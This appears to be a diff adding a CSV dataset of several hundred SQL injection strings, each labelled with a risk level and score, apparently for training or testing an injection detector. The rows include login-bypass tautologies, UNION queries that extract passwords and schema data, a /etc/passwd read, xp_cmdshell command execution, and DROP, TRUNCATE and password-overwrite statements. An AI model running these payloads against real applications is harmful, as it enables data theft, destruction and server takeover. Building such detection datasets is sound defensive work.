@@ -1,0 +1,701 @@
+query,risk,score
+"' UNION SELECT username, password FROM users /**/ /* test */",medium,40
+' HAVING 1=1 #,medium,40
+'; DELETE FROM users; /**/,critical,100
+' or true/*,low,10
+1' OR '1'='1,low,10
+user' or 'x'='x,low,10
+'; DROP TABLE users; -- /* test */,critical,100
+1' or 1=1 #,low,10
+user' Or 'x'='x,low,10
+' or 'a'='a,low,10
+admin' /**/,low,10
+admin' --,low,10
+'; SELECT load_file('/etc/passwd'); #,critical,100
+1' or true --,low,10
+1' or 1=1 --,low,10
+admin'-- -,low,10
+' Or 1=1 -- /* test */,low,10
+' Or 'x'='x,low,10
+' or true#,low,10
+"' UNION SELECT NULL, column_name FROM information_schema.columns --",high,70
+' Or 'x'='x,low,10
+1' or '1'='1' --,low,10
+' OR true --,low,10
+user' or 'x'='x,low,10
+1'  or  '1'='1' --,low,10
+admin'/* ,low,10
+' or 'a'='a,low,10
+' OR true -- /* test */,low,10
+1' Or '1'='1,low,10
+user' or 'x'='x,low,10
+1' or 1=1 /**/,low,10
+' OR '1'='1' --,low,10
+1'; SELECT * FROM users /**/,medium,40
+' OR 1=1 LIMIT 1 --,low,10
+' OR TRUE #,low,10
+"' UNION SELECT uid, pwd FROM members /**/",medium,40
+' or 'x'='x,low,10
+' or 1 LIKE 1/*,low,10
+1' or 1=1 --,low,10
+';  SELECT  COUNT(*) FROM users --,medium,40
+1' or '1'='1' #,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' #,medium,40
+1' or 1=1 /**/,low,10
+1' or '1'='1' /**/,low,10
+"' AND (SELECT benchmark(1000000, MD5('x'))) #",high,70
+"' UNION SELECT NULL, sqlite_version() /**/",high,70
+' OR TRUE --,low,10
+' or 2>1 --,low,10
+1=1' or '1'='1,low,10
+' OR 'a'='a,low,10
+1=1' OR '1'='1,low,10
+' or 1=1#,low,10
+' or 1=1 LIMIT 1 --,low,10
+user' OR 'x'='x,low,10
+"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables /**/",high,70
+"' UNION SELECT username, password FROM users WHERE 1=1 --",medium,40
+admin'/*,low,10
+' OR '1'='1,low,10
+"' AND (SELECT benchmark(1000000, MD5('x'))) #",high,70
+' Or 2>1 --,low,10
+' OR 1=1 LIMIT 1 --,low,10
+' OR 2>1 --,low,10
+' Or '1'='1,low,10
+admin'/*,low,10
+1' or '1'='1' --,low,10
+') OR ('a'='a,low,10
+' or true/*,low,10
+1'; SELECT  * FROM users --,medium,40
+"' UNION SELECT  username, password FROM  users WHERE 1=1  --",medium,40
+'; DROP DATABASE db_name; /**/,critical,100
+' OR '1'='1' --,low,10
+admin'/*,low,10
+' OR true --,low,10
+"' UNION SELECT uid, pwd FROM members #",medium,40
+' or TRUE --,low,10
+' OR 'x'='x,low,10
+'; SELECT COUNT(*) FROM users --,medium,40
+admin'-- -,low,10
+admin'/*,low,10
+' Or 1=1 -- /* test */,low,10
+' OR 'x'='x,low,10
+1=1' OR '1'='1,low,10
+1' or '1'='1' --,low,10
+' OR '1'='1' /**/,low,10
+admin' --,low,10
+admin'# -,low,10
+1' or '1'='1' --,low,10
+1'; SELECT * FROM users /**/,medium,40
+admin'# -,low,10
+1' or 1 LIKE 1 --,low,10
+' or 1=1 -- /* test */,low,10
+' OR 2>1 --,low,10
+1=1' Or '1'='1,low,10
+' or 'x'='x,low,10
+' or 1=1#,low,10
+' or '1'='1,low,10
+' OR 'x'='x,low,10
+' OR '1'='1' /**/,low,10
+' OR 1=1 /**/,low,10
+' OR '1'='1' #,low,10
+"' UNION SELECT user_id, password FROM user_table --",medium,40
+"' UNION SELECT user_id, password FROM user_table /**/",medium,40
+1' or '1'='1' /**/,low,10
+admin'/**/ -,low,10
+"' UNION SELECT NULL, sqlite_version() --",high,70
+' OR '1'='1' --,low,10
+"' UNION SELECT user_id, password FROM user_table #",medium,40
+1=1' Or '1'='1,low,10
+admin'/*,low,10
+' Or '1'='1,low,10
+user' Or 'x'='x,low,10
+'; TRUNCATE TABLE users; #,critical,100
+1' Or '1'='1,low,10
+"' UNION SELECT username, password FROM users /**/ /* test */",medium,40
+user' OR 'x'='x,low,10
+"' UNION SELECT uid, pwd FROM members --",medium,40
+') Or ('a'='a,low,10
+1' or '1'='1' /**/,low,10
+"' UNION SELECT username, password FROM users WHERE 1=1 --",medium,40
+"' UNION SELECT user_id, password FROM user_table /**/",medium,40
+' or 1=1#,low,10
+'; DROP DATABASE db_name; /**/,critical,100
+' OR 2>1 #,low,10
+' or 1=1/*,low,10
+' OR 1=1 -- /* test */,low,10
+"' UNION SELECT  user_id,  password  FROM  user_table --",medium,40
+' or EXISTS(SELECT * FROM users) --,medium,40
+' or 1 LIKE 1/*,low,10
+1' or '1'='1' /**/,low,10
+1' or '1'='1' /**/,low,10
+admin'/*,low,10
+"1'; SELECT username, password FROM users /**/",medium,40
+' OR 'x'='x,low,10
+user' OR 'x'='x,low,10
+admin' /**/,low,10
+' or 1 LIKE 1#,low,10
+' Or 'a'='a,low,10
+1=1' or '1'='1,low,10
+"' UNION SELECT uid, pwd FROM members --",medium,40
+' OR 1=1 --,low,10
+' OR 'a'='a,low,10
+"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables --",high,70
+admin' #,low,10
+"' UNION SELECT NULL, database(), user() #",high,70
+'; SELECT COUNT(*) FROM users /**/,medium,40
+admin'-- -,low,10
+' Or '1'='1,low,10
+' OR 1 LIKE 1 --,low,10
+' or 'a'='a,low,10
+1' OR '1'='1,low,10
+' OR TRUE --,low,10
+"1'; SELECT username, password FROM users /**/",medium,40
+' OR 1=1 --,low,10
+') OR ('a'='a,low,10
+' OR TRUE #,low,10
+' or '1'='1,low,10
+' Or '1'='1' --,low,10
+admin' /**/,low,10
+"1'; SELECT username, password FROM users --",medium,40
+' OR '1'='1' --,low,10
+admin'-- -,low,10
+' OR 1=1 LIMIT 1 #,low,10
+admin' --,low,10
+user' OR 'x'='x,low,10
+"' UNION SELECT uid, pwd FROM members --",medium,40
+' OR 1=1 LIMIT 1 --,low,10
+' OR 2>1 --,low,10
+'; SELECT COUNT(*) FROM users --,medium,40
+1' OR '1'='1,low,10
+' or 1=1# ,low,10
+' or '1'='1' --,low,10
+' HAVING true --,medium,40
+' OR EXISTS(SELECT * FROM information_schema.tables) #,high,70
+1' or 1 LIKE 1 --,low,10
+' OR 1=1 # /* test */,low,10
+' or 'x'='x,low,10
+' Or '1'='1,low,10
+') Or ('a'='a,low,10
+admin'/**/ -,low,10
+"' UNION SELECT username, password FROM users WHERE 1=1 #",medium,40
+1' OR '1'='1,low,10
+'  OR TRUE  --,low,10
+' or true#,low,10
+user' or 'x'='x,low,10
+1' or '1'='1' /**/,low,10
+' Or 'x'='x,low,10
+user' or 'x'='x,low,10
+' OR 1=1 /**/,low,10
+' OR EXISTS(SELECT * FROM users) /**/,medium,40
+"' UNION SELECT NULL, column_name FROM information_schema.columns --",high,70
+admin' #,low,10
+"' UNION SELECT NULL, table_name FROM information_schema.tables --",high,70
+' AND (SELECT sleep(5)) #,high,70
+"' UNION SELECT NULL, table_name FROM information_schema.tables /**/",high,70
+' Or '1'='1,low,10
+1' or '1'='1,low,10
+"' UNION SELECT username, password FROM users WHERE 1=1 --",medium,40
+' or 1=1 -- /* test */,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' --,medium,40
+' OR '1'='1,low,10
+' or 'x'='x,low,10
+' OR 'a'='a,low,10
+'; SELECT load_file('/etc/passwd'); /**/,critical,100
+1' or 1=1 #,low,10
+"' UNION SELECT NULL, database(), user() --",high,70
+' or 1 LIKE 1/*,low,10
+' or '1'='1,low,10
+1' or '1'='1' /**/,low,10
+' or 1 LIKE 1#,low,10
+' Or '1'='1,low,10
+' OR 1=1 /**/ /* test */,low,10
+admin'/*,low,10
+' OR  'x'='x,low,10
+' or 'a'='a,low,10
+true' OR '1'='1,low,10
+' or EXISTS(SELECT * FROM users) --,medium,40
+' HAVING 1=1 --,medium,40
+"' UNION SELECT NULL, database(), user() #",high,70
+' OR TRUE --,low,10
+admin'-- -,low,10
+admin' --,low,10
+"' UNION SELECT NULL, version(), current_user /**/",high,70
+"' UNION SELECT username, password FROM users /**/ /* test */",medium,40
+admin'/*,low,10
+1=1' OR '1'='1,low,10
+"' UNION SELECT username, password FROM users WHERE 1 LIKE 1 --",medium,40
+' or 'x'='x,low,10
+"' UNION SELECT user_id, password FROM user_table #",medium,40
+1=1' OR '1'='1,low,10
+"' UNION SELECT NULL, schema_name FROM information_schema.schemata #",high,70
+' or '1'='1' --,low,10
+true' OR '1'='1,low,10
+' or 1=1 -- /* test */,low,10
+' Or 'x'='x,low,10
+' OR  TRUE  --,low,10
+' Or 2>1 --,low,10
+' OR 'x'='x,low,10
+') Or ('a'='a,low,10
+' OR 1 LIKE 1 --,low,10
+'; EXEC xp_cmdshell('net user'); /**/,critical,100
+1' or true --,low,10
+"1'; SELECT username, password FROM users --",medium,40
+1=1' OR '1'='1,low,10
+' OR 1=1 --,low,10
+1' or '1'='1' --,low,10
+1'; SELECT * FROM users /**/,medium,40
+' OR 'x'='x,low,10
+"1'; SELECT username, password FROM users #",medium,40
+') OR ('a'='a,low,10
+' OR 2>1 #,low,10
+' OR 'a'='a,low,10
+' OR 1=1 -- /* test */,low,10
+' OR TRUE --,low,10
+1 LIKE 1' OR '1'='1,low,10
+user' Or 'x'='x,low,10
+'; DELETE FROM users; -- ,critical,100
+' OR 'x'='x,low,10
+' OR '1'='1,low,10
+1' or true --,low,10
+1'; SELECT * FROM users #,medium,40
+1' Or '1'='1,low,10
+'; EXEC xp_cmdshell('net user'); --,critical,100
+' OR 1 LIKE 1 LIMIT 1 --,low,10
+1' or '1'='1' --,low,10
+1=1' or '1'='1,low,10
+' OR 1=1 LIMIT 1 #,low,10
+'; SELECT COUNT(*) FROM users --,medium,40
+"' UNION SELECT uid, pwd FROM members /**/",medium,40
+' OR 1=1 LIMIT 1 /**/,low,10
+') OR ('a'='a,low,10
+' or 'a'='a,low,10
+1' or '1'='1' --,low,10
+1' or '1'='1' #,low,10
+' OR '1'='1' #,low,10
+' Or 1=1 --,low,10
+') or ('a'='a,low,10
+admin' #,low,10
+1=1' OR '1'='1,low,10
+' or 1 LIKE 1#,low,10
+' OR EXISTS(SELECT * FROM users) #,medium,40
+' OR 'x'='x,low,10
+admin'/*,low,10
+admin'# -,low,10
+' OR '1'='1,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' /**/,medium,40
+"' UNION SELECT NULL, sqlite_version() /**/",high,70
+' or '1'='1,low,10
+' OR TRUE --,low,10
+' Or 1=1 LIMIT 1 --,low,10
+' OR 1=1 LIMIT 1 --,low,10
+"' UNION SELECT NULL, schema_name FROM information_schema.schemata --",high,70
+') or ('a'='a,low,10
+admin' --,low,10
+1=1' or '1'='1,low,10
+"' UNION SELECT username, password FROM users WHERE true --",medium,40
+"' UNION SELECT uid, pwd FROM members --",medium,40
+"'; INSERT  INTO users  (username, password)  VALUES  ('hacker','hacked'); --",critical,100
+' Or '1'='1' --,low,10
+1' or '1'='1' /**/,low,10
+' OR 'a'='a,low,10
+' OR 1=1  -- /* test  */ ,low,10
+admin'/*,low,10
+' Or 'x'='x,low,10
+'; TRUNCATE TABLE users; #,critical,100
+"' UNION SELECT NULL, sqlite_version() #",high,70
+' OR '1'='1' #,low,10
+' or 1 LIKE 1#,low,10
+1';  SELECT *  FROM users  --,medium,40
+1' OR '1'='1,low,10
+' OR 2>1 --,low,10
+'; UPDATE users SET password='hacked'; #,critical,100
+' OR TRUE /**/,low,10
+admin'-- -,low,10
+' OR 1=1 LIMIT 1 --,low,10
+' OR TRUE --,low,10
+"' UNION SELECT NULL, database(), user() /**/",high,70
+' OR 1=1 LIMIT 1 --,low,10
+' OR 1=1 #,low,10
+' or 2>1 --,low,10
+admin'/**/ -,low,10
+' Or 1=1 -- /* test */,low,10
+' or 1 LIKE 1/*,low,10
+' Or '1'='1' --,low,10
+' or 1=1#,low,10
+' or 1 LIKE 1/*,low,10
+"' AND (SELECT benchmark(1000000, MD5('x'))) /**/",high,70
+1=1' Or '1'='1,low,10
+1' or 1=1 /**/,low,10
+' HAVING 1=1 --,medium,40
+"' UNION SELECT NULL, column_name FROM information_schema.columns /**/",high,70
+' OR '1'='1' --,low,10
+1' or '1'='1' #,low,10
+"' UNION SELECT NULL, schema_name FROM information_schema.schemata --",high,70
+1'  or  1=1 --,low,10
+' OR 'a'='a,low,10
+' OR true LIMIT 1 --,low,10
+admin'/*,low,10
+' OR 1=1 LIMIT 1 /**/,low,10
+1'; SELECT * FROM users #,medium,40
+"' UNION SELECT username, password FROM users WHERE 1=1 --",medium,40
+' OR 1=1 -- /* test */,low,10
+'  OR '1'='1,low,10
+' OR 1=1 LIMIT 1 /**/,low,10
+"' UNION SELECT NULL, sqlite_version() --",high,70
+' OR TRUE #,low,10
+admin'/**/ -,low,10
+' OR TRUE /**/,low,10
+' OR true LIMIT 1 --,low,10
+admin'# -,low,10
+') Or ('a'='a,low,10
+' or 1 LIKE 1#,low,10
+' or 1=1/*,low,10
+' OR 1=1 /**/,low,10
+admin'/*,low,10
+user' Or 'x'='x,low,10
+' OR 1=1 # /* test */,low,10
+' OR 1=1 # /* test */,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' /**/,medium,40
+' OR 1=1 -- /* test */,low,10
+1' or '1'='1,low,10
+"' UNION SELECT username, password FROM users WHERE 1=1 /**/",medium,40
+1' or '1'='1' #,low,10
+' Or '1'='1' --,low,10
+' OR 1=1 #,low,10
+'; SELECT COUNT(*) FROM users --,medium,40
+' or 1=1 LIMIT 1 --,low,10
+' OR 1 LIKE 1 -- /* test */,low,10
+' OR 'x'='x,low,10
+' OR 'x'='x,low,10
+' HAVING 1=1 --,medium,40
+"' UNION SELECT NULL, table_name FROM information_schema.tables /**/",high,70
+admin'/**/ -,low,10
+1=1' OR '1'='1,low,10
+'; TRUNCATE TABLE users; --,critical,100
+' Or 'x'='x,low,10
+' OR TRUE --,low,10
+"' UNION SELECT NULL, column_name FROM information_schema.columns /**/",high,70
+"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables --",high,70
+"' UNION SELECT NULL, schema_name FROM information_schema.schemata --",high,70
+1' Or '1'='1,low,10
+' Or 'x'='x,low,10
+'; TRUNCATE TABLE users; #,critical,100
+1=1' Or '1'='1,low,10
+"' UNION SELECT NULL, sqlite_version() --",high,70
+') OR ('a'='a,low,10
+' OR true LIMIT 1 --,low,10
+'; DROP DATABASE db_name; #,critical,100
+"' UNION SELECT NULL, sqlite_version() /**/",high,70
+' OR 1=1 LIMIT 1 --,low,10
+' OR EXISTS(SELECT * FROM users) #,medium,40
+' or 'a'='a,low,10
+1=1' Or '1'='1,low,10
+' or true#,low,10
+' Or 'a'='a,low,10
+') OR ('a'='a,low,10
+"' AND (SELECT benchmark(1000000, MD5('x'))) #",high,70
+' OR 1=1 LIMIT 1 --,low,10
+'; DROP TABLE users; /**/ /* test */,critical,100
+1' OR '1'='1,low,10
+' OR '1'='1,low,10
+' or TRUE --,low,10
+"'; INSERT INTO users (username, password) VALUES ('hacker','hacked'); /**/",critical,100
+' OR 1=1 /**/ /* test */,low,10
+admin' /**/,low,10
+' OR 1=1 --,low,10
+' OR '1'='1,low,10
+1' or '1'='1,low,10
+"' UNION SELECT NULL, version(), current_user /**/",high,70
+' Or '1'='1' --,low,10
+admin'/*,low,10
+' or 1=1#,low,10
+"' UNION SELECT NULL, table_name FROM information_schema.tables #",high,70
+1' or '1'='1' --,low,10
+user' Or 'x'='x,low,10
+') Or ('a'='a,low,10
+"' UNION SELECT user_id, password FROM user_table --",medium,40
+"'; INSERT INTO users (username, password) VALUES ('hacker','hacked'); --",critical,100
+'; EXEC master..xp_cmdshell 'cmd /c dir'; /**/,critical,100
+' or true/*,low,10
+' Or 1=1 LIMIT 1 --,low,10
+admin' --,low,10
+1' or '1'='1' --,low,10
+' OR '1'='1,low,10
+' or true#,low,10
+' or 1=1/* ,low,10
+"' UNION SELECT username, password FROM users # /* test */",medium,40
+1' Or '1'='1,low,10
+admin' --,low,10
+') OR ('a'='a,low,10
+' HAVING true --,medium,40
+"'  UNION SELECT NULL, schema_name FROM  information_schema.schemata  --",high,70
+') Or ('a'='a,low,10
+1' or 1=1 --,low,10
+user' OR 'x'='x,low,10
+' HAVING true --,medium,40
+admin'/* ,low,10
+admin' /**/,low,10
+"' UNION SELECT NULL, version(), current_user #",high,70
+1' or '1'='1' #,low,10
+admin'/**/ -,low,10
+admin'# -,low,10
+admin'# -,low,10
+' OR 2>1 --,low,10
+' or 1 LIKE 1#,low,10
+' or 1=1#,low,10
+' OR 2>1 --,low,10
+'; EXEC xp_cmdshell('net user');  -- ,critical,100
+'; SELECT COUNT(*) FROM users /**/,medium,40
+' OR EXISTS(SELECT * FROM information_schema.tables) --,high,70
+' Or 'x'='x,low,10
+' or 1 LIKE 1/*,low,10
+1'; SELECT * FROM users --,medium,40
+1' or 1=1 --,low,10
+"' UNION SELECT NULL, column_name FROM information_schema.columns --",high,70
+' OR true -- /* test */,low,10
+' Or 1=1 --,low,10
+"1'; SELECT username, password FROM users /**/",medium,40
+admin'# -,low,10
+"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables #",high,70
+' OR '1'='1,low,10
+user' OR 'x'='x,low,10
+' OR 2>1 #,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' /**/,medium,40
+'; EXEC xp_cmdshell('net user'); #,critical,100
+' OR 1=1 -- /* test */,low,10
+'; SELECT COUNT(*) FROM users #,medium,40
+' Or '1'='1' --,low,10
+' or TRUE --,low,10
+"' UNION SELECT NULL, database(), user() #",high,70
+1' Or '1'='1,low,10
+1=1' Or '1'='1,low,10
+') or ('a'='a,low,10
+' OR 'x'='x,low,10
+' or 'a'='a,low,10
+' OR true --,low,10
+1' or '1'='1' --,low,10
+') OR ('a'='a,low,10
+"' UNION SELECT username, password FROM users # /* test */",medium,40
+admin'/*,low,10
+'; EXEC xp_cmdshell('net user'); #,critical,100
+1=1' OR '1'='1,low,10
+' Or 'a'='a,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' --,medium,40
+"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables --",high,70
+"' UNION SELECT NULL, version(), current_user /**/",high,70
+user' OR 'x'='x,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' --,medium,40
+"' UNION SELECT NULL, column_name FROM information_schema.columns --",high,70
+' Or 'x'='x,low,10
+admin' --,low,10
+' OR '1'='1,low,10
+'; SELECT COUNT(*) FROM users --,medium,40
+' or 'x'='x,low,10
+admin'-- -,low,10
+' or 1 LIKE 1/*,low,10
+' OR 1 LIKE 1 -- /* test */,low,10
+' or 'x'='x,low,10
+admin' --,low,10
+admin' /**/,low,10
+' OR '1'='1,low,10
+"' UNION SELECT NULL, sqlite_version() /**/",high,70
+"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables /**/",high,70
+admin' #,low,10
+1=1' OR '1'='1,low,10
+') or ('a'='a,low,10
+' OR 1=1 -- /* test */,low,10
+' or 1 LIKE 1/*,low,10
+' OR 1=1 --,low,10
+' Or TRUE --,low,10
+' OR true -- /* test */,low,10
+' or TRUE --,low,10
+' or 'x'='x,low,10
+' OR TRUE /**/,low,10
+' OR 'x'='x,low,10
+' or EXISTS(SELECT * FROM information_schema.tables) --,high,70
+' Or EXISTS(SELECT * FROM users) --,medium,40
+1' or 1=1 --,low,10
+' OR '1'='1,low,10
+"' UNION SELECT uid, pwd FROM members --",medium,40
+' Or '1'='1,low,10
+' Or 2>1 --,low,10
+1' or '1'='1' -- ,low,10
+' or 1=1 --,low,10
+1=1' OR '1'='1,low,10
+1' or 1=1 --,low,10
+' or 1=1/*,low,10
+"1'; SELECT  username, password FROM users  -- ",medium,40
+') OR ('a'='a,low,10
+'; DROP DATABASE db_name;  -- ,critical,100
+' or 'a'='a,low,10
+' OR TRUE --,low,10
+"' UNION  SELECT uid, pwd FROM members --",medium,40
+' OR 'x'='x,low,10
+"' AND (SELECT benchmark(1000000, MD5('x'))) --",high,70
+' or true#,low,10
+' OR true -- /* test */,low,10
+' OR TRUE --,low,10
+user' Or 'x'='x,low,10
+"1'; SELECT  username,  password FROM users -- ",medium,40
+"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables /**/",high,70
+admin'/**/ -,low,10
+admin'/*,low,10
+' Or '1'='1,low,10
+'; SELECT COUNT(*) FROM users /**/,medium,40
+"1'; SELECT username, password FROM users /**/",medium,40
+' or 'a'='a,low,10
+' or true/*,low,10
+'; DROP TABLE users; /**/ /* test */,critical,100
+"' UNION SELECT NULL, sqlite_version() /**/",high,70
+1'; SELECT  * FROM users  --,medium,40
+1' or '1'='1' --,low,10
+true' OR '1'='1,low,10
+' or 'x'='x,low,10
+"' UNION SELECT uid, pwd FROM members #",medium,40
+' OR EXISTS(SELECT * FROM users) --,medium,40
+admin'/**/ -,low,10
+' or 1=1 LIMIT 1 --,low,10
+admin'/**/ -,low,10
+' OR TRUE --,low,10
+"' UNION SELECT NULL, table_name FROM information_schema.tables /**/",high,70
+1' or 1=1 #,low,10
+1' OR '1'='1,low,10
+1' or '1'='1' --,low,10
+' or '1'='1,low,10
+admin' --,low,10
+' or 1=1/*,low,10
+' OR 1 LIKE 1 --,low,10
+' OR 'a'='a,low,10
+' Or 1=1 --,low,10
+user' OR 'x'='x,low,10
+admin'# -,low,10
+1'; SELECT * FROM users /**/,medium,40
+1=1' Or '1'='1,low,10
+' Or 'x'='x,low,10
+' OR '1'='1,low,10
+' or 'x'='x,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' --,medium,40
+' AND (SELECT sleep(5)) --,high,70
+"' UNION SELECT NULL, table_name FROM information_schema.tables --",high,70
+1=1' or '1'='1,low,10
+' or 1=1#,low,10
+1'; SELECT * FROM users /**/,medium,40
+' OR TRUE --,low,10
+"1'; SELECT username, password FROM users #",medium,40
+') Or ('a'='a,low,10
+' or true#,low,10
+admin' --,low,10
+' or 'a'='a,low,10
+' OR 1=1 LIMIT 1 --,low,10
+') OR ('a'='a,low,10
+' OR '1'='1' --,low,10
+1' or '1'='1' --,low,10
+' OR '1'='1' --,low,10
+' Or '1'='1,low,10
+1' or '1'='1' #,low,10
+' OR 'a'='a,low,10
+' OR 1=1 --,low,10
+user' Or 'x'='x,low,10
+' OR TRUE --,low,10
+' Or EXISTS(SELECT * FROM information_schema.tables) --,high,70
+'; EXEC xp_cmdshell('net user'); --,critical,100
+' OR 1 LIKE 1 -- /* test */,low,10
+1' Or '1'='1,low,10
+' or 1 LIKE 1/*,low,10
+"'; INSERT INTO users (username, password) VALUES ('hacker','hacked'); /**/",critical,100
+user' Or 'x'='x,low,10
+"' UNION SELECT NULL, version(), current_user #",high,70
+'; UPDATE users SET password='hacked'; #,critical,100
+' OR 1=1 LIMIT 1 --,low,10
+admin'-- -,low,10
+1' or '1'='1,low,10
+'; EXEC master..xp_cmdshell 'cmd /c dir'; --,critical,100
+' HAVING true --,medium,40
+1=1' OR '1'='1,low,10
+1' or '1'='1' /**/,low,10
+' OR EXISTS(SELECT * FROM users) /**/,medium,40
+' or 'x'='x,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' #,medium,40
+' or 1=1#,low,10
+1' OR '1'='1,low,10
+1' or true --,low,10
+'; SELECT COUNT(*) FROM users #,medium,40
+' Or 'x'='x,low,10
+' or 'x'='x,low,10
+"1'; SELECT username, password FROM users --",medium,40
+"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables --",high,70
+'; EXEC master..xp_cmdshell 'cmd /c dir'; #,critical,100
+' AND (SELECT sleep(5)) --,high,70
+' or true#,low,10
+' or 'a'='a,low,10
+' Or EXISTS(SELECT * FROM information_schema.tables) --,high,70
+' Or '1'='1,low,10
+' or true/*,low,10
+' Or '1'='1' --,low,10
+admin'# -,low,10
+admin'/*,low,10
+admin'/* ,low,10
+admin' /**/,low,10
+' OR 1 LIKE 1 --,low,10
+'; SELECT COUNT(*) FROM users #,medium,40
+' Or 'x'='x,low,10
+"' UNION SELECT NULL, table_name FROM information_schema.tables #",high,70
+"' UNION SELECT NULL, concat(table_schema, '.', table_name) FROM information_schema.tables --",high,70
+' Or '1'='1' --,low,10
+') Or ('a'='a,low,10
+') OR ('a'='a,low,10
+1' or 1=1 --,low,10
+user' OR 'x'='x,low,10
+' or 1=1/*,low,10
+1'; SELECT * FROM users #,medium,40
+"' UNION SELECT NULL, schema_name FROM information_schema.schemata /**/",high,70
+user' Or 'x'='x,low,10
+1=1' Or '1'='1,low,10
+admin'; SELECT * FROM users WHERE name LIKE '%admin%' --,medium,40
+"' UNION SELECT NULL, table_name FROM information_schema.tables --",high,70
+"' AND (SELECT benchmark(1000000, MD5('x'))) #",high,70
+admin'/*,low,10
+1' OR '1'='1,low,10
+"' UNION SELECT user_id, password FROM user_table --",medium,40
+1' or true --,low,10
+' OR 1=1 -- /* test */,low,10
+1'; SELECT * FROM users /**/,medium,40
+' OR TRUE --,low,10
+' or true/*,low,10
+') or ('a'='a,low,10
+' or '1'='1,low,10
+1' Or '1'='1,low,10
+' OR '1'='1' /**/,low,10
+1' or '1'='1' #,low,10
+' or 'a'='a,low,10
+"1'; SELECT username, password FROM users #",medium,40
+1' Or '1'='1,low,10
+' or true/*,low,10
+admin' #,low,10
+' OR 2>1 --,low,10
+' Or '1'='1,low,10
+"' UNION SELECT NULL, database(), user() --",high,70
+' or 'a'='a,low,10
+"' UNION SELECT NULL, schema_name FROM information_schema.schemata --",high,70
+"' UNION SELECT user_id, password FROM user_table #",medium,40
+"' UNION SELECT username, password FROM users # /* test */",medium,40
+"' UNION SELECT NULL, table_name FROM information_schema.tables --",high,70
+admin';  SELECT * FROM  users  WHERE name LIKE '%admin%' --,medium,40
+1=1' or '1'='1,low,10
+"' UNION SELECT NULL, schema_name FROM information_schema.schemata #",high,70
+' AND (SELECT sleep(5)) --,high,70
+' or 1=1 -- /* test */,low,10
+true' OR '1'='1,low,10
+admin'-- -,low,10
+admin'# -,low,10
+"' UNION SELECT NULL, version(), current_user /**/",high,70
+'; SELECT COUNT(*) FROM users --,medium,40
+' OR 2>1 --,low,10
+' Or 'x'='x,low,10
+'; SELECT COUNT(*) FROM users /**/,medium,40
+"' UNION SELECT NULL, sqlite_version() /**/",high,70
+1 LIKE 1' OR '1'='1,low,10
+1=1' OR '1'='1,low,10
+"' UNION SELECT NULL, table_name FROM information_schema.tables /**/",high,70
+' or TRUE --,low,10
